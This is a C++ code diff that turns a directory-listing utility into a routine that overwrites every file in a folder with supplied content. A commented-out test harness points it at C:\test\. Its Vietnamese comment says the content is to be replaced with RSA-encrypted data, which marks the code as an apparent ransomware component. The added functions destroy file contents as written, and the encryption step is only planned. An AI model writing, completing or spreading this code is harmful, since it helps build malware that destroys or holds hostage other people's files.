@@ -2,6 +2,7 @@
 #include <filesystem>
 #include <vector>
 #include <string>
+#include <fstream>
 
 namespace fs = std::filesystem;
 
@@ -28,29 +29,48 @@ std::vector<FileItem> listFilesAndDirectories(const std::string& path) {
 }
 
 // Function to read and print the content of a file
-void readFileContent(const std::string& filePath) {
-    std::ifstream file(filePath);
-    if (file) {
-        std::string line;
-        while (std::getline(file, line)) {
-            std::cout << line << std::endl;
-        }
-        file.close();
+// void readFileContent(const std::string& filePath) {
+//     std::ifstream file(filePath);
+//     if (file) {
+//         std::string line;
+//         while (std::getline(file, line)) {
+//             std::cout << line << std::endl;
+//         }
+//         file.close();
+//     } else {
+//         std::cerr << "Unable to open file: " << filePath << std::endl;
+//     }
+// }
+
+// Function to modify and save content of a file
+void modifyFileContent(const std::string& filePath, const std::string& content) {
+    std::ofstream outFile(filePath);
+    if (outFile) {
+        outFile << content;
+        outFile.close();
     } else {
-        std::cerr << "Unable to open file: " << filePath << std::endl;
+        std::cerr << "Unable to open or create file: " << filePath << std::endl;
     }
 }
 
-// Function to print out files and directories from the data structure
-void print(const std::vector<FileItem>& items, const std::string& prefix, const std::string& currentPath) {
+// Function to traverse and modify if it is a file
+void traverseAndModifyFiles(const std::vector<FileItem>& items, const std::string& currentPath, const std::string& content) {
     for (const auto& item : items) {
-        std::cout << prefix;
-        std::cout << (item.isDirectory ? "Directory: " : "File: ") << item.name << std::endl;
-
-        if (item.isDirectory) {
-            std::string newPath = currentPath + item.name + "/";
-            std::vector<FileItem> subItems = listFilesAndDirectories(newPath);
-            print(subItems, prefix + "  ", newPath);
+        if (!item.isDirectory) {
+            modifyFileContent(currentPath + item.name, content); // Call function to modify file content
         }
     }
 }
+
+// Hàm main này dùng để test trực tiếp trong file, khi dùng bỏ note ra để dùng, content sẽ thay bằng đoạn mã hóa rsa.
+// int main() {
+//     std::string path = "C:\\test\\";
+
+//     std::string content = "abcqsadjkdfghdafsdflsadljasljd";
+
+//     std::vector<FileItem> filesAndDirs = listFilesAndDirectories(path);
+
+//     traverseAndModifyFiles(filesAndDirs, path, content);
+
+//     return 0;
+// }
